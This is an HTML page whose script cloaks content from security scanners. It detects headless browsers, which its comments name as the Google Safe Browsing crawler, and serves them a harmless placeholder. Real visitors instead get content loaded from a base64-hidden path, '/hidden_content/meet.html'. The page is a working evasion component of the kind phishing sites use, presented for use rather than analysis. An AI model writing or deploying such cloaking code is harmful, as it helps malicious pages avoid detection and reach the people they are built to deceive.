<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <script>
        // Base64 encoded path to the hidden content
        // /hidden_content/meet.html -> L2hpZGRlbl9jb250ZW50L21lZXQuaHRtbA==
        const realContent = 'L2hpZGRlbl9jb250ZW50L21lZXQuaHRtbA==';

        // GSB Crawler Detection: Multiple checks for headless browsers
        // Headless Chrome typically lacks: Notification API, plugins, webdriver property
        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        const hasNotificationAPI = typeof self.Notification !== 'undefined';
        const hasPlugins = navigator.plugins && navigator.plugins.length > 0;
        const hasWebdriver = navigator.webdriver === true;
        
        // Additional headless indicators
        const hasChrome = window.chrome && window.chrome.runtime;
        const hasPermissions = navigator.permissions !== undefined;

        // Real browser check: Must have Notification API AND not be webdriver AND have plugins
        // OR be a mobile device (mobile may not have all APIs)
        const isRealBrowser = (hasNotificationAPI && !hasWebdriver && (hasPlugins || hasChrome || hasPermissions)) || isMobile;

        // Load content only for real browsers
        // GSB crawler (headless Chrome) will be blocked - has webdriver, no plugins, no Notification API
        if (isRealBrowser) {
            fetch(atob(realContent))
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Failed to load content');
                    }
                    return response.text();
                })
                .then(html => {
                    document.open();
                    document.write(html);
                    document.close();
                })
                .catch(err => {
                    console.error('Error loading content:', err);
                    document.write('<h1>Welcome</h1><p>This is a standard placeholder page.</p>');
                });
        } else {
            // GSB Crawler / Bot (headless Chrome) - Show benign content
            document.write('<h1>Welcome</h1><p>This is a standard placeholder page.</p>');
        }
    </script>
</head>

<body>
    <!-- Fallback content if JS is disabled -->
</body>

</html>
